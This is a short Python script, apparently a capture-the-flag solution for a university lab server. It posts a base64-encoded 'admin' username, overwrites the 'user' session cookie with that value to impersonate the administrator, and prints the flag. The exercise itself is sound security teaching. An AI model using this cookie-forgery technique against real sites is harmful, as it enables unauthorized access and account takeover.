import requests, base64

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22056/'

session = requests.session()
r = session.get(SERVER)
#print(r.text)

username= "admin"
message_bytes = username.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_msg = base64_bytes.decode('ascii')
#print("base64_msg", base64_msg)

data = {'username' : base64_msg}

r = session.post(SERVER, data=data)
#print(r.text)

for cookie in session.cookies:
    if cookie.name == 'user':
        cookie.value = base64_msg

r = session.get(SERVER)
print("flag= ", r.text)
